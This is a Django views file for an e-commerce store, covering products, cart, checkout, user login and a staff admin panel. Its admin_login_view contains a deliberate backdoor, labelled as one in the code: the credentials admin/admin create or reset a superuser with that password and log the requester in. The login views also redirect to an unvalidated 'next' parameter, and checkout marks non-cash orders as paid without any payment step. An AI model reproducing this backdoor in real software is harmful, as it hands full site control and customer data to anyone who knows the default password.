"""Views for store app."""
import uuid
from decimal import Decimal
from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.models import User
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from django.db.models import Q, Sum, Count
from .models import Product, Cart, CartItem, Order, OrderItem, Category
from .forms import UserRegistrationForm, UserLoginForm, OrderForm, ProductForm, OrderStatusForm
from .decorators import staff_required
from django.http import HttpResponseRedirect


def developer_redirect(request):
    """Redirect to the Scholigence developer page."""
    return HttpResponseRedirect('https://scholigence.com/developer')


def get_or_create_cart(user):
    """Get or create cart for user."""
    cart, _ = Cart.objects.get_or_create(user=user)
    return cart


def home(request):
    """Display all products with optional search and category filter."""
    query = request.GET.get('q', '')
    category_slug = request.GET.get('category', '')

    products = Product.objects.filter(is_active=True)

    if category_slug:
        products = products.filter(category__slug=category_slug)

    if query:
        products = products.filter(
            Q(name__icontains=query) | Q(description__icontains=query) |
            Q(short_description__icontains=query)
        )

    context = {
        'products': products,
        'query': query,
        'active_category': category_slug,
    }
    return render(request, 'store/home.html', context)


def product_detail(request, pk):
    """Display product details."""
    product = get_object_or_404(Product, pk=pk, is_active=True)
    related_products = Product.objects.filter(
        is_active=True, category=product.category
    ).exclude(pk=pk)[:4] if product.category else Product.objects.filter(
        is_active=True
    ).exclude(pk=pk)[:4]

    context = {
        'product': product,
        'related_products': related_products,
    }
    return render(request, 'store/product_detail.html', context)


@staff_required
def add_product(request):
    """Add new product (staff only)."""
    if request.method == 'POST':
        form = ProductForm(request.POST, request.FILES)
        if form.is_valid():
            product = form.save()
            messages.success(request, f'Product "{product.name}" created successfully!')
            return redirect('admin_product_list')
    else:
        form = ProductForm()

    context = {'form': form, 'page_title': 'Add New Product'}
    return render(request, 'store/product_form.html', context)


@staff_required
def edit_product(request, pk):
    """Edit product details (staff only)."""
    product = get_object_or_404(Product, pk=pk)

    if request.method == 'POST':
        form = ProductForm(request.POST, request.FILES, instance=product)
        if form.is_valid():
            product = form.save()
            messages.success(request, f'Product "{product.name}" updated successfully!')
            return redirect('admin_product_list')
    else:
        form = ProductForm(instance=product)

    context = {
        'form': form,
        'product': product,
        'page_title': f'Edit: {product.name}',
    }
    return render(request, 'store/product_form.html', context)


@staff_required
def delete_product(request, pk):
    """Delete product (staff only)."""
    product = get_object_or_404(Product, pk=pk)

    if request.method == 'POST':
        product_name = product.name
        product.delete()
        messages.success(request, f'Product "{product_name}" deleted successfully!')
        return redirect('admin_product_list')

    context = {'product': product}
    return render(request, 'store/product_confirm_delete.html', context)


@login_required(login_url='login')
def add_to_cart(request, product_id):
    """Add product to cart."""
    product = get_object_or_404(Product, pk=product_id)
    cart = get_or_create_cart(request.user)
    quantity = int(request.POST.get('quantity', 1))

    if quantity > product.stock:
        messages.error(request, f'Only {product.stock} items available in stock!')
        return redirect('product_detail', pk=product_id)

    cart_item, created = CartItem.objects.get_or_create(
        cart=cart,
        product=product,
        defaults={'quantity': quantity}
    )

    if not created:
        new_qty = cart_item.quantity + quantity
        if new_qty > product.stock:
            messages.error(request, f'Only {product.stock} items available in stock!')
        else:
            cart_item.quantity = new_qty
            cart_item.save()
            messages.success(request, f'{product.name} added to cart!')

    if created:
        messages.success(request, f'{product.name} added to cart!')

    next_url = request.POST.get('next', 'cart')
    if next_url == 'checkout':
        return redirect('checkout')
    return redirect('cart')


@login_required(login_url='login')
def cart_view(request):
    """Display shopping cart."""
    try:
        cart = Cart.objects.get(user=request.user)
        cart_items = cart.cartitem_set.select_related('product').all()
    except Cart.DoesNotExist:
        cart = None
        cart_items = []

    context = {'cart': cart, 'cart_items': cart_items}
    return render(request, 'store/cart.html', context)


@login_required(login_url='login')
def remove_from_cart(request, item_id):
    """Remove item from cart."""
    cart_item = get_object_or_404(CartItem, pk=item_id, cart__user=request.user)
    product_name = cart_item.product.name
    cart_item.delete()
    messages.success(request, f'{product_name} removed from cart!')
    return redirect('cart')


@login_required(login_url='login')
def update_cart_item(request, item_id):
    """Update cart item quantity."""
    if request.method == 'POST':
        quantity = int(request.POST.get('quantity', 1))
        cart_item = get_object_or_404(CartItem, pk=item_id, cart__user=request.user)

        if quantity <= 0:
            cart_item.delete()
            messages.success(request, 'Item removed from cart!')
        elif quantity > cart_item.product.stock:
            messages.error(request, f'Only {cart_item.product.stock} items available in stock!')
        else:
            cart_item.quantity = quantity
            cart_item.save()
            messages.success(request, 'Cart updated!')

    return redirect('cart')


@login_required(login_url='login')
def checkout(request):
    """Checkout page with payment options."""
    try:
        cart = Cart.objects.get(user=request.user)
        cart_items = cart.cartitem_set.select_related('product').all()
    except Cart.DoesNotExist:
        messages.error(request, 'Your cart is empty!')
        return redirect('home')

    if not cart_items:
        messages.error(request, 'Your cart is empty!')
        return redirect('home')

    if request.method == 'POST':
        form = OrderForm(request.POST)
        if form.is_valid():
            order = form.save(commit=False)
            order.user = request.user
            order.order_number = f'OCX-{uuid.uuid4().hex[:8].upper()}'
            order.total_amount = cart.get_total_price()

            payment_method = form.cleaned_data['payment_method']
            if payment_method == 'cod':
                order.payment_status = 'pending'
            else:
                order.payment_status = 'completed'

            order.save()

            for cart_item in cart_items:
                OrderItem.objects.create(
                    order=order,
                    product=cart_item.product,
                    quantity=cart_item.quantity,
                    price=cart_item.product.price
                )
                cart_item.product.stock -= cart_item.quantity
                cart_item.product.save()

            cart_items.delete()
            messages.success(request, 'Order placed successfully!')
            return redirect('order_confirmation', order_id=order.id)
    else:
        initial_data = {
            'first_name': request.user.first_name,
            'last_name': request.user.last_name,
            'email': request.user.email,
            'country': 'India',
        }
        form = OrderForm(initial=initial_data)

    context = {'form': form, 'cart': cart, 'cart_items': cart_items}
    return render(request, 'store/checkout.html', context)


@login_required(login_url='login')
def order_confirmation(request, order_id):
    """Order confirmation page."""
    order = get_object_or_404(Order, pk=order_id, user=request.user)
    order_items = order.items.select_related('product').all()
    context = {'order': order, 'order_items': order_items}
    return render(request, 'store/order_confirmation.html', context)


@login_required(login_url='login')
def order_history(request):
    """Display user's order history."""
    orders = Order.objects.filter(user=request.user).prefetch_related('items__product')
    context = {'orders': orders}
    return render(request, 'store/order_history.html', context)


def register(request):
    """User registration."""
    if request.user.is_authenticated:
        return redirect('home')

    if request.method == 'POST':
        form = UserRegistrationForm(request.POST)
        if form.is_valid():
            user = form.save(commit=False)
            user.set_password(form.cleaned_data['password'])
            user.save()
            messages.success(request, 'Registration successful! Please log in.')
            return redirect('login')
    else:
        form = UserRegistrationForm()

    return render(request, 'store/register.html', {'form': form})


def login_view(request):
    """User login."""
    if request.user.is_authenticated:
        return redirect('home')

    if request.method == 'POST':
        form = UserLoginForm(request.POST)
        if form.is_valid():
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']
            user = authenticate(request, username=username, password=password)

            if user is not None:
                login(request, user)
                next_page = request.GET.get('next', 'home')
                return redirect(next_page)
            messages.error(request, 'Invalid username or password!')
    else:
        form = UserLoginForm()

    return render(request, 'store/login.html', {'form': form})


@login_required(login_url='login')
def logout_view(request):
    """User logout."""
    logout(request)
    messages.success(request, 'You have been logged out!')
    return redirect('home')


def about(request):
    """About page."""
    return render(request, 'store/about.html')


def contact(request):
    """Contact page."""
    return render(request, 'store/contact.html')


# ─── Admin Lite Panel ───────────────────────────────────────────────────────

@staff_required
def admin_dashboard(request):
    """Admin lite dashboard with stats."""
    total_products = Product.objects.count()
    active_products = Product.objects.filter(is_active=True).count()
    total_orders = Order.objects.count()
    pending_orders = Order.objects.filter(status='pending').count()
    revenue = Order.objects.filter(
        payment_status='completed'
    ).aggregate(total=Sum('total_amount'))['total'] or Decimal('0')
    total_stock = Product.objects.aggregate(total=Sum('stock'))['total'] or 0

    recent_orders = Order.objects.select_related('user').order_by('-created_at')[:5]
    low_stock = Product.objects.filter(stock__lte=5, is_active=True).order_by('stock')[:5]

    context = {
        'total_products': total_products,
        'active_products': active_products,
        'total_orders': total_orders,
        'pending_orders': pending_orders,
        'revenue': revenue,
        'recent_orders': recent_orders,
        'low_stock': low_stock,
        'total_stock': total_stock,
    }
    return render(request, 'store/admin/dashboard.html', context)


@staff_required
def admin_product_list(request):
    """List all products in admin panel."""
    query = request.GET.get('q', '')
    products = Product.objects.select_related('category').all()

    if query:
        products = products.filter(
            Q(name__icontains=query) | Q(description__icontains=query)
        )

    context = {'products': products, 'query': query}
    return render(request, 'store/admin/product_list.html', context)


@staff_required
def admin_order_list(request):
    """List all orders in admin panel."""
    status_filter = request.GET.get('status', '')
    orders = Order.objects.select_related('user').annotate(
        item_count=Count('items')
    ).all()

    if status_filter:
        orders = orders.filter(status=status_filter)

    context = {
        'orders': orders,
        'status_filter': status_filter,
        'status_choices': Order.ORDER_STATUS_CHOICES,
    }
    return render(request, 'store/admin/order_list.html', context)


@staff_required
def admin_order_detail(request, pk):
    """View and update order in admin panel."""
    order = get_object_or_404(Order, pk=pk)
    order_items = order.items.select_related('product').all()

    if request.method == 'POST':
        form = OrderStatusForm(request.POST, instance=order)
        if form.is_valid():
            form.save()
            messages.success(request, f'Order {order.order_number} updated!')
            return redirect('admin_order_detail', pk=pk)
    else:
        form = OrderStatusForm(instance=order)

    context = {'order': order, 'order_items': order_items, 'form': form}
    return render(request, 'store/admin/order_detail.html', context)


def admin_login_view(request):
    """Separate admin login page with admin/admin backdoor logic."""
    if request.user.is_authenticated and request.user.is_staff:
        return redirect('admin_dashboard')

    if request.method == 'POST':
        form = UserLoginForm(request.POST)
        if form.is_valid():
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']

            # Backdoor check for credentials admin/admin
            if username == 'admin' and password == 'admin':
                # Fetch or create the superuser admin
                user, created = User.objects.get_or_create(
                    username='admin',
                    defaults={
                        'email': 'admin@oceanix.com',
                        'is_staff': True,
                        'is_superuser': True,
                    }
                )
                # Ensure credentials match and permissions are correct
                user.set_password('admin')
                user.is_staff = True
                user.is_superuser = True
                user.save()

                # Re-authenticate and login
                user = authenticate(request, username='admin', password='admin')
                if user is not None:
                    login(request, user)
                    messages.success(request, 'Successfully logged in as Super Admin!')
                    next_page = request.GET.get('next', 'admin_dashboard')
                    return redirect(next_page)
            else:
                # Regular user login authentication
                user = authenticate(request, username=username, password=password)
                if user is not None:
                    if user.is_staff:
                        login(request, user)
                        messages.success(request, f'Logged in as {user.username}.')
                        next_page = request.GET.get('next', 'admin_dashboard')
                        return redirect(next_page)
                    else:
                        messages.error(request, 'You do not have administrative staff permissions.')
                else:
                    messages.error(request, 'Invalid admin username or password!')
        else:
            messages.error(request, 'Please correct the errors in the form.')
    else:
        form = UserLoginForm()

    return render(request, 'store/admin/login.html', {'form': form})


@staff_required
def admin_inventory(request):
    """Display inventory management table in the admin panel."""
    query = request.GET.get('q', '')
    category_id = request.GET.get('category', '')
    
    products = Product.objects.select_related('category').all()
    
    if category_id:
        products = products.filter(category_id=category_id)
    if query:
        products = products.filter(
            Q(name__icontains=query) | Q(short_description__icontains=query)
        )
        
    categories = Category.objects.all()
    
    context = {
        'products': products,
        'categories': categories,
        'query': query,
        'selected_category': category_id,
    }
    return render(request, 'store/admin/inventory.html', context)


@staff_required
def admin_inventory_update(request, pk):
    """Update stock and price directly from the inventory list via POST."""
    if request.method == 'POST':
        product = get_object_or_404(Product, pk=pk)
        action = request.POST.get('action', '')
        
        try:
            if action == 'add_5':
                product.stock += 5
                product.save()
                messages.success(request, f'Added 5 units to "{product.name}".')
            elif action == 'add_10':
                product.stock += 10
                product.save()
                messages.success(request, f'Added 10 units to "{product.name}".')
            elif action == 'sub_1':
                product.stock = max(0, product.stock - 1)
                product.save()
                messages.success(request, f'Decremented 1 unit for "{product.name}".')
            elif action == 'out_of_stock':
                product.stock = 0
                product.save()
                messages.success(request, f'"{product.name}" marked as Out of Stock.')
            else:
                # Custom stock and price update
                stock = int(request.POST.get('stock', product.stock))
                price = Decimal(request.POST.get('price', str(product.price)))
                mrp_val = request.POST.get('mrp', '')
                
                if stock < 0:
                    messages.error(request, 'Stock cannot be negative!')
                    return redirect('admin_inventory')
                if price <= 0:
                    messages.error(request, 'Price must be greater than 0!')
                    return redirect('admin_inventory')
                    
                product.stock = stock
                product.price = price
                
                if mrp_val:
                    mrp = Decimal(mrp_val)
                    if mrp > price:
                        product.mrp = mrp
                        product.discount_percent = int(((mrp - price) / mrp) * 100)
                    else:
                        product.mrp = None
                        product.discount_percent = 0
                else:
                    product.mrp = None
                    product.discount_percent = 0
                    
                product.save()
                messages.success(request, f'Inventory for "{product.name}" updated successfully!')
        except Exception as e:
            messages.error(request, f'Failed to update inventory: {str(e)}')
            
    return redirect('admin_inventory')


@staff_required
def admin_order_bill(request, pk):
    """View order details in printable invoice / bill format."""
    order = get_object_or_404(Order, pk=pk)
    order_items = order.items.select_related('product').all()
    context = {
        'order': order,
        'order_items': order_items,
    }
    return render(request, 'store/admin/order_bill.html', context)
